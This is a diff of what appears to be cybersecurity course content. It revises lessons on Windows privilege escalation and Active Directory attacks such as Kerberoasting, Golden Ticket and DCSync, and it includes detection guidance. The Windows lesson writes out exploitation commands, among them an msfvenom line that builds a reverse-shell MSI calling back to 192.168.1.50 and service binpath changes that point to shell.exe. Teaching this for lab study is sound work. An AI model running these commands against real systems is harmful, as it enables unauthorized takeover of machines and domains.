@@ -1971,7 +1971,7 @@ Always try the safest vectors first (sudo, SUID, cron) before resorting to kerne
         type: 'learn',
         duration: '2 hours',
         content: `:::objectives
-- Enumerate Windows system information relevant to escalation
+- Understand how Windows security model works (tokens, SIDs, integrity levels)
 - Identify service misconfigurations, registry settings, and credential issues
 - Use WinPEAS for automated Windows privilege escalation enumeration
 :::
@@ -1980,57 +1980,100 @@ Always try the safest vectors first (sudo, SUID, cron) before resorting to kerne
 All techniques in this topic are for local lab use only, never against systems you don't own or have explicit authorization to test.
 :::
 
-## Enumeration Commands
+## How Windows Security Works
+
+Windows uses a different security model than Linux. Understanding it is essential for privilege escalation.
+
+**Security Tokens:** When a user logs in, Windows creates a security token containing:
+- **SID (Security Identifier):** Unique identifier for the user (e.g., S-1-5-21-...)
+- **Group memberships:** Which groups the user belongs to
+- **Privileges:** What the user is allowed to do (e.g., SeImpersonatePrivilege)
+- **Integrity level:** Low, Medium, High, or System
+
+**Integrity Levels:**
+| Level | Who Runs At This | What They Can Do |
+|-------|-----------------|-----------------|
+| Low | Untrusted processes, sandboxed apps | Very limited — can't write to most locations |
+| Medium | Standard users | Normal operations — can't modify system files |
+| High | Administrators (elevated) | Full admin access — can modify most things |
+| System | Windows services, kernel | Complete control — can do anything |
+
+**Why this matters for privesc:** If you're running as Medium integrity and can get a process to run as High or System, you've escalated. The vectors are: misconfigured services, weak permissions, stored credentials, token impersonation.
+
+## Step 1: Enumeration — Know Your Position
 
 \`\`\`bash
-# System information
-systeminfo                    # OS version, patches, hotfixes
-hostname                      # Computer name
+# Who are you and what can you do?
+whoami
+whoami /priv          # Your privileges (SeImpersonatePrivilege is gold)
+whoami /groups        # Group memberships (BUILTIN\\Administrators = admin)
 
-# User information
-whoami                        # Current user
-whoami /priv                  # Current privileges
-whoami /groups                # Group memberships
-net user                      # List all users
-net localgroup administrators # List admin group members
+# What system are you on?
+systeminfo            # OS version, patches, hotfixes
+hostname              # Computer name
 
-# Network information
-ipconfig /all                 # Network configuration
-route print                   # Routing table
-netstat -ano                   # Listening ports
+# Who else is here?
+net user              # All local users
+net localgroup administrators   # Who's in the admin group
+
+# Network context
+ipconfig /all         # Network configuration
+netstat -ano          # Listening ports with PIDs
 \`\`\`
 
-## Service Misconfigurations
+:::tip
+Always check \`whoami /priv\` first. If you see SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege, Potato attacks may give you SYSTEM.
+:::
 
-### Unquoted Service Paths
-If a service path contains spaces and is not quoted, Windows may try alternative paths:
+## Step 2: Unquoted Service Paths — Windows Path Search
 
+When a service path contains spaces and is NOT quoted, Windows tries alternative paths:
+
+\`\`\`
+Service path: C:\\Program Files\\My Service\\service.exe
+
+Windows tries (in order):
+1. C:\\Program.exe
+2. C:\\Program Files\\My.exe
+3. C:\\Program Files\\My Service\\service.exe
+\`\`\`
+
+**Why this works:** Windows parses the path from left to right, looking for an executable at each space. If you can write to \`C:\\\`, you can place a malicious \`Program.exe\` that runs as the service account (often SYSTEM).
+
+**Find unquoted service paths:**
 \`\`\`bash
-# Find unquoted service paths
 wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows" | findstr /i /v '"'
 \`\`\`
 
-If a service has path: \`C:\\Program Files\\My Service\\service.exe\`
-Windows tries: \`C:\\Program.exe\`, then \`C:\\Program Files\\My.exe\`, etc.
-
-Place a malicious executable at the earlier path to escalate.
-
-### Weak Service Permissions
+**Exploitation:**
 \`\`\`bash
-# Check service permissions with accesschk (Sysinternals)
-accesschk.exe /accepteula -uwcqv "Authenticated Users" * /svc
+# Place malicious executable at the earlier path
+copy C:\\temp\\shell.exe "C:\\Program.exe"
+
+# Restart the service (if you have permission)
+sc stop VulnService
+sc start VulnService
 \`\`\`
 
-If you can modify a service's binary path:
+## Step 3: Weak Service Permissions — Modify the Binary Path
+
+If you can modify a service's configuration, you can change what it runs:
+
 \`\`\`bash
+# Check service permissions
+accesschk.exe /accepteula -uwcqv "Authenticated Users" * /svc
+
+# If you have SERVICE_ALL_CONFIG permission:
 sc config VulnService binpath= "C:\\temp\\shell.exe"
 sc stop VulnService
 sc start VulnService
 \`\`\`
 
-## AlwaysInstallElevated
+**Why this works:** The service runs with its original account's privileges (often SYSTEM). If you change the binary path to your malicious executable, it runs as SYSTEM when the service starts.
 
-If both registry keys are set to 1, any user can install MSI packages as SYSTEM:
+## Step 4: AlwaysInstallElevated — MSI as SYSTEM
+
+If both registry keys are set to 1, ANY user can install MSI packages with SYSTEM privileges:
 
 \`\`\`bash
 reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer
@@ -2042,22 +2085,40 @@ If both return \`AlwaysInstallElevated = 0x1\`:
 # Generate a malicious MSI
 msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f msi -o shell.msi
 
-# Install it
+# Install it (runs as SYSTEM)
 msiexec /quiet /qn /i shell.msi
 \`\`\`
 
-## Token Impersonation (Potato Attacks)
+**Why this works:** The AlwaysInstallElevated policy was designed for enterprise software deployment. It's a misconfiguration when enabled on user workstations.
+
+## Step 5: Token Impersonation (Potato Attacks)
 
 :::warning
 Potato attacks require specific Windows versions and configurations. They are for lab study only.
 :::
 
-- **RottenPotato / JuicyPotato:** Exploit SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
-- These attack NTLM authentication to impersonate SYSTEM
-- Check privileges: \`whoami /priv\`
-- If SeImpersonatePrivilege is enabled, Potato attacks may work
+**SeImpersonatePrivilege** allows a process to impersonate other users' tokens. If you have this privilege (common for service accounts), Potato attacks can escalate to SYSTEM.
 
-## Stored Credentials
+**How it works:**
+1. The attacker triggers NTLM authentication from the SYSTEM account
+2. The attacker intercepts the NTLM hash
+3. The attacker impersonates the SYSTEM token
+
+**Check if you have the privilege:**
+\`\`\`bash
+whoami /priv
+# Look for: SeImpersonatePrivilege  Enabled
+\`\`\`
+
+**Common Potato variants:**
+- RottenPotato (Windows 7/Server 2008)
+- JuicyPotato (Windows 8/10/Server 2012/2016)
+- PrintSpoofer (Windows 10/Server 2016+)
+- GodPotato (Windows 8-11/Server 2012-2022)
+
+## Step 6: Stored Credentials
+
+Windows can store credentials for "runas" commands:
 
 \`\`\`bash
 # Check for saved credentials
@@ -2067,18 +2128,35 @@ cmdkey /list
 runas /savecred /user:admin C:\\temp\\shell.exe
 \`\`\`
 
-## WinPEAS Automation
+## Step 7: DLL Hijacking
+
+If a service loads a DLL from a writable directory, place a malicious DLL there:
+
+1. Use ProcMon (Sysinternals) to find "NAME NOT FOUND" for DLLs
+2. Check if the directory is writable
+3. Place your malicious DLL with the expected name
+4. Restart the service
+
+## Step 8: Registry AutoRuns
 
 \`\`\`bash
-# Download WinPEAS
-# From attacker machine, transfer to target
+reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+\`\`\`
+
+If an AutoRun entry points to a writable path, replace it with a malicious executable. It runs at the next login.
+
+## WinPEAS — Automated Enumeration
+
+\`\`\`bash
+# Transfer WinPEAS to target
 upload winpeas.exe C:\\temp\\
 
 # Run WinPEAS
 C:\\temp\\winpeas.exe
 \`\`\`
 
-WinPEAS checks:
+**What WinPEAS checks:**
 - Unquoted service paths
 - Weak service permissions
 - AlwaysInstallElevated
@@ -2086,24 +2164,12 @@ WinPEAS checks:
 - Token privileges
 - DLL hijacking opportunities
 - Kernel exploits
-
-## Other Vectors
-
-### DLL Hijacking
-If a service loads a DLL from a writable directory, place a malicious DLL there.
-
-### Registry AutoRuns
-\`\`\`bash
-reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
-reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
-\`\`\`
-
-If an AutoRun entry points to a writable path, replace it with a malicious executable.
+- Registry autoruns
+- Scheduled tasks
 
 :::checkpoint
 Run WinPEAS on a local vulnerable Windows VM. Identify at least 2 privilege escalation vectors and explain how you would exploit one of them.
-:::
-`,
+:::`,
         aiPrompt: '',
         labUrl: '',
         labTitle: '',
@@ -2495,128 +2561,113 @@ Map out the Kerberos authentication flow from memory. Which tickets are involved
         type: 'learn',
         duration: '2 hours',
         content: `:::objectives
-- Explain Kerberoasting, AS-REP Roasting, and Pass-the-Hash attacks
-- Understand Golden Ticket and DCSync concepts
+- Understand how Kerberos authentication works and why it's exploitable
+- Explain Kerberoasting, AS-REP Roasting, Pass-the-Hash, Golden Ticket, and DCSync at the protocol level
 - Identify detection strategies for each attack
-- Set up a free AD lab environment for practice
 :::
 
 :::warning
 All attack techniques described in this topic are for local lab use only, never against production systems without explicit authorization. Unauthorized access to computer systems is illegal.
 :::
 
-:::info
-This topic covers attacks conceptually. Practical exploitation will come in later phases. Understanding attacks conceptually is critical for both offensive and defensive security roles.
-:::
+## How Kerberos Authentication Works
 
-## Kerberoasting
+Before understanding AD attacks, you need to understand Kerberos — the authentication protocol that Active Directory uses.
 
-### Concept
-An attacker requests Service Tickets (TGS) for any service with an SPN registered, then cracks the tickets offline to recover the service account password.
+**The Kerberos flow:**
 
-### How It Works
-1. Attacker authenticates to AD (any user account)
-2. Queries for accounts with SPNs: \`setspn -T domain -Q */*\`
-3. Requests TGS tickets for each SPN
-4. Exports tickets in crackable format
-5. Offline password cracking with Hashcat mode 13100
+1. User sends username to the Domain Controller (DC)
+2. DC checks if the user exists and sends back a TGT (Ticket Granting Ticket), encrypted with the KRBTGT account hash
+3. User presents the TGT to the DC and requests a TGS (Ticket Granting Service) for a specific service (e.g., SQL server)
+4. DC sends back a TGS encrypted with the service account's password hash
+5. User presents the TGS to the service and gets access
 
-### Detection Strategy
-- Monitor for unusual volumes of TGS-REQ events (Event ID 4769)
-- Alert on encryption type changes (RC4 instead of AES)
-- Track SPN enumeration activity
+**Why this matters:** Each stage has a different attack vector. The attacks below target specific weaknesses in this flow.
 
-## AS-REP Roasting
+## Kerberoasting — Stealing Service Account Passwords
 
-### Concept
-Targets accounts that have Kerberos pre-authentication disabled. An attacker can request authentication data for these accounts without valid credentials and crack it offline.
+**The weakness:** Any authenticated user can request a TGS for ANY service with an SPN (Service Principal Name). The TGS is encrypted with the service account's NTLM hash. If you crack the hash, you have the service account's password.
 
-### How It Works
-1. Enumerate accounts with pre-auth disabled: \`Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}\`
-2. Request AS-REP for each account
-3. Extract the encrypted part and crack offline with Hashcat mode 18200
+**Why this works:**
+1. You authenticate as a normal user (low privilege)
+2. You ask the DC: "Give me a ticket for the SQL service"
+3. The DC sends you a TGS encrypted with the SQL service account's hash
+4. You take the TGS offline and crack it with Hashcat (mode 13100)
+5. If the password is weak (and service accounts often have weak passwords), you crack it in minutes
 
-### Detection Strategy
-- Monitor for Event ID 4768 (TGT requests) for accounts with pre-auth disabled
-- Review and enforce pre-authentication requirements on all accounts
-- Audit accounts with DONT_REQUIRE_PREAUTH flag
+**The key insight:** The DC doesn't check if you actually NEED access to the service. It just hands out the ticket. This is by design — Kerberos was built for usability, not security.
 
-## Pass-the-Hash (PtH)
+**Detection:** Monitor Event ID 4769 (TGS requests). If one user requests tickets for many SPNs in a short time, it's Kerberoasting.
 
-### Concept
-An attacker uses a captured NTLM hash directly to authenticate without knowing the plaintext password. The hash is passed to the authentication protocol as if it were the password.
+## AS-REP Roasting — Attacking Pre-Auth Disabled Accounts
 
-### How It Works
-1. Attacker captures NTLM hash (via SAM dump, LSASS, etc.)
-2. Uses tools like mimikatz or psexec to authenticate with the hash
-3. No password cracking required
+**The weakness:** Some accounts have "Do not require Kerberos pre-authentication" enabled. This means the DC sends the AS-REP (Authentication Service Response) without requiring the user to prove they know the password first.
 
-### Detection Strategy
-- Monitor for NTLM authentication events where the source is unusual
-- Implement Credential Guard to protect LSASS
-- Restrict NTLM usage where possible
-- Alert on Pass-the-Hash detection tools in logs
+**Why this works:**
+1. Normally: User sends a timestamp encrypted with their password hash → DC verifies → sends TGT
+2. With pre-auth disabled: User sends username → DC sends back the AS-REP encrypted with the user's hash (no proof required)
+3. Attacker captures the AS-REP and cracks it offline (Hashcat mode 18200)
 
-## Golden Ticket
+**The key insight:** Pre-authentication is a security feature that prevents offline attacks. Disabling it removes this protection entirely.
 
-### Concept
-An attacker forges TGTs using the KRBTGT account hash, granting unlimited access to any resource in the domain. This is the most powerful AD attack.
+**Detection:** Monitor Event ID 4768 (TGT requests) for accounts with pre-auth disabled. Audit accounts with the DONT_REQUIRE_PREAUTH flag.
 
-### How It Works
-1. Attacker obtains the KRBTGT hash (requires domain admin or DCSync)
-2. Forges a TGT for any user, any group (including Domain Admins)
-3. TGT is valid for the default 10-hour window (or longer if modified)
-4. Cannot be detected by normal authentication logs
+## Pass-the-Hash — Using Stolen Hashes Directly
 
-### Detection Strategy
-- Protect the KRBTGT account - change the password twice annually
-- Monitor for KRBTGT hash access
-- Detect TGTs with anomalous characteristics (unusual lifetime, modified fields)
-- Regular password rotation limits the window of exploitation
+**The weakness:** Windows NTLM authentication doesn't require the plaintext password — it only requires the hash. If you have the hash, you can authenticate as the user.
 
-## DCSync
+**Why this works:**
+1. Attacker dumps password hashes from SAM database or LSASS process
+2. Attacker uses the hash directly in an NTLM authentication request
+3. The server verifies the hash matches — authentication succeeds
+4. No password cracking required
 
-### Concept
-An attacker simulates a Domain Controller and requests password data replication from the real DC, obtaining all password hashes in the domain.
+**The key insight:** NTLM authentication is a challenge-response protocol. The server sends a challenge, the client responds with the hash. If you have the hash, you can respond correctly without knowing the password.
 
-### How It Works
-1. Attacker gains Domain Admin or similar privileges
-2. Uses mimikatz or similar tools to replicate directory data
-3. Receives NTLM hashes for all domain accounts including KRBTGT
+**Detection:** Monitor for NTLM authentication from unusual sources. Implement Credential Guard to protect LSASS. Restrict NTLM usage where possible.
 
-### Detection Strategy
-- Monitor Event ID 4662 (Directory Service Access) for replication operations
-- Alert on non-DC machines performing directory replication
-- Restrict which accounts can replicate directory data
+## Golden Ticket — Forging Domain Admin Access
 
-## Free AD Lab Setup
+**The weakness:** The KRBTGT account hash is used to encrypt TGTs. If you have this hash, you can forge TGTs for ANY user, ANY group, with ANY expiration time.
 
-### Option 1: Windows Server 2022 Evaluation + Windows 10 VM
-- Download Windows Server 2022 Eval from Microsoft
-- Download Windows 10 Evaluation from Microsoft
-- Use VirtualBox (free) or VMware Workstation Player (free)
+**Why this works:**
+1. Attacker obtains the KRBTGT hash (requires Domain Admin or DCSync)
+2. Attacker creates a fake TGT claiming to be "Administrator" in "Domain Admins"
+3. Attacker encrypts the TGT with the KRBTGT hash
+4. The DC accepts the forged TGT as legitimate
+5. Attacker has Domain Admin access for as long as they want
 
-### Option 2: Vulnerable-by-Design AD Labs
-- **GOAD (Game of Active Directory):** Pre-built vulnerable AD environment
-- **DetectionLab:** Automates building a detection-focused lab
-- **VulnAD:** Microsoft's official vulnerable AD lab
+**The key insight:** The DC trusts any TGT encrypted with the KRBTGT hash. If you have the hash, you ARE the DC. This is the most powerful AD attack — it's essentially game over for the domain.
 
-### Hardware Requirements
-| RAM   | Capability                              |
-|------|------------------------------------------|
-| 4GB  | Theory only - too limited for AD VMs     |
-| 8GB  | WSL2-based lab possible                  |
-| 16GB | Full AD lab feasible                     |
-| 32GB | Comfortable multi-VM lab environment     |
+**Detection:** Protect the KRBTGT account. Change the password twice annually. Monitor for KRBTGT hash access. Detect TGTs with anomalous characteristics (unusual lifetime, modified fields).
 
-:::tip
-Start with the theory if your hardware is limited. Understanding AD concepts is valuable even without a practical lab.
-:::
+## DCSync — Stealing All Domain Passwords
+
+**The weakness:** Domain Controllers replicate password data between each other using the DRS (Directory Replication Service) protocol. Any account with Replicating Directory Changes permissions can request this data.
+
+**Why this works:**
+1. Attacker gains Domain Admin or Replicating Directory Changes privileges
+2. Attacker's machine sends a replication request to the DC
+3. The DC sends back ALL password hashes in the domain (including KRBTGT)
+4. Attacker now has every password hash — can forge any ticket, impersonate anyone
+
+**The key insight:** DCSync is not an exploit — it's a legitimate feature. The DC is designed to replicate password data to authorized machines. The attack is getting authorized access to request replication.
+
+**Detection:** Monitor Event ID 4662 (Directory Service Access) for replication operations. Alert on non-DC machines performing directory replication. Restrict which accounts can replicate directory data.
+
+## Attack Relationships
+
+\`\`\`
+Kerberoasting → Get service account password → Lateral movement
+AS-REP Roasting → Get user password → Initial access
+Pass-the-Hash → Authenticate without password → Lateral movement
+DCSync → Get ALL hashes → Golden Ticket → Domain Admin forever
+Golden Ticket → Impersonate anyone → Complete domain compromise
+\`\`\`
 
 :::checkpoint
-Explain the Kerberos authentication flow and identify where Kerberoasting attacks fit in. What event IDs would you monitor to detect this attack?
-:::
-`,
+You understand how Kerberos authentication works and why each attack exploits a specific weakness in the flow. You can explain the mechanism behind each attack, not just the commands.
+:::`,
         aiPrompt: '',
         labUrl: '',
         labTitle: '',
